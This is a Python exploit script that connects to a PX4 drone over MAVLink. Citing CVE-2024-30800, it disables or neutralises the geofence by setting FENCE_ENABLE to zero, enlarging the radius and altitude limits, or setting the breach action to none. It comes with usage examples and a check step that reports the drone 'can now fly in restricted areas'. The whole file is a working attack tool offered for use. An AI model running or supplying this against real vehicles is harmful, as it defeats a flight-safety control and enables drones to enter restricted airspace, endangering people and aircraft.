#!/usr/bin/env python3
"""
Geofence Bypass Exploit Script
Exploits CVE-2024-30800 to bypass geofence restrictions
"""

import sys
import time
from pymavlink import mavutil

def bypass_geofence(connection, method='disable'):
    """
    Bypass geofence using various methods
    
    Args:
        connection: MAVLink connection object
        method: Bypass method ('disable', 'modify', 'action')
    
    Returns:
        True if successful
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[*] Attempting geofence bypass (method: {method})...")
    print("[*] CVE-2024-30800: Geofence bypass vulnerability")
    
    if method == 'disable':
        # Method 1: Disable geofence entirely
        print("[*] Method 1: Disabling geofence (FENCE_ENABLE = 0)")
        param_id = 'FENCE_ENABLE'.ljust(16, '\x00')[:16]
        connection.mav.param_set_send(
            target_system,
            target_component,
            param_id.encode('utf-8'),
            0,  # Disable
            mavutil.mavlink.MAV_PARAM_TYPE_UINT8
        )
        time.sleep(0.5)
        print("[+] Geofence disabled")
        return True
    
    elif method == 'modify':
        # Method 2: Modify geofence boundaries to be very large
        print("[*] Method 2: Modifying geofence boundaries")
        
        # Set very large radius (1000 km)
        param_id = 'FENCE_RADIUS'.ljust(16, '\x00')[:16]
        connection.mav.param_set_send(
            target_system,
            target_component,
            param_id.encode('utf-8'),
            1000000.0,  # 1000 km
            mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        time.sleep(0.5)
        
        # Set very high altitude (50 km)
        param_id = 'FENCE_ALT_MAX'.ljust(16, '\x00')[:16]
        connection.mav.param_set_send(
            target_system,
            target_component,
            param_id.encode('utf-8'),
            50000.0,  # 50 km
            mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        time.sleep(0.5)
        print("[+] Geofence boundaries modified")
        return True
    
    elif method == 'action':
        # Method 3: Change geofence action to none
        print("[*] Method 3: Changing geofence action")
        param_id = 'FENCE_ACTION'.ljust(16, '\x00')[:16]
        connection.mav.param_set_send(
            target_system,
            target_component,
            param_id.encode('utf-8'),
            0,  # None (no action on breach)
            mavutil.mavlink.MAV_PARAM_TYPE_UINT8
        )
        time.sleep(0.5)
        print("[+] Geofence action changed to none")
        return True
    
    elif method == 'all':
        # Try all methods
        print("[*] Method: Trying all bypass techniques")
        bypass_geofence(connection, 'disable')
        time.sleep(1)
        bypass_geofence(connection, 'modify')
        time.sleep(1)
        bypass_geofence(connection, 'action')
        return True
    
    return False

def verify_bypass(connection):
    """
    Verify geofence bypass by checking parameters
    
    Args:
        connection: MAVLink connection object
    
    Returns:
        Dictionary with verification results
    """
    print("[*] Verifying geofence bypass...")
    
    # Request parameters
    connection.mav.param_request_read_send(
        connection.target_system,
        connection.target_component,
        'FENCE_ENABLE'.encode('utf-8'),
        -1
    )
    
    time.sleep(0.5)
    msg = connection.recv_match(type='PARAM_VALUE', blocking=True, timeout=2)
    
    result = {
        'fence_enabled': None,
        'bypassed': False
    }
    
    if msg:
        param_name = msg.param_id.rstrip('\x00')
        if param_name == 'FENCE_ENABLE':
            result['fence_enabled'] = bool(msg.param_value)
            result['bypassed'] = not bool(msg.param_value)
            print(f"[+] FENCE_ENABLE = {msg.param_value} ({'DISABLED' if result['bypassed'] else 'ENABLED'})")
    
    return result

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 geofence_bypass.py <connection> [method]")
        print("Example: python3 geofence_bypass.py udp:127.0.0.1:14550")
        print("Example: python3 geofence_bypass.py udp:127.0.0.1:14550 disable")
        print("Example: python3 geofence_bypass.py udp:127.0.0.1:14550 all")
        print("\nMethods:")
        print("  disable  - Disable geofence (FENCE_ENABLE=0)")
        print("  modify   - Modify boundaries to be very large")
        print("  action   - Change action to none")
        print("  all      - Try all methods (default)")
        print("\nCVE-2024-30800: PX4-Autopilot geofence bypass vulnerability")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    method = sys.argv[2] if len(sys.argv) > 2 else 'all'
    
    if method not in ['disable', 'modify', 'action', 'all']:
        print(f"[-] Unknown method: {method}")
        print("[*] Valid methods: disable, modify, action, all")
        sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Attempt bypass
    success = bypass_geofence(connection, method)
    
    if success:
        # Verify bypass
        result = verify_bypass(connection)
        if result['bypassed']:
            print("\n[+] Geofence bypass successful!")
            print("[+] Drone can now fly in restricted areas")
        else:
            print("\n[!] Bypass attempted but verification unclear")
    else:
        print("\n[-] Geofence bypass failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
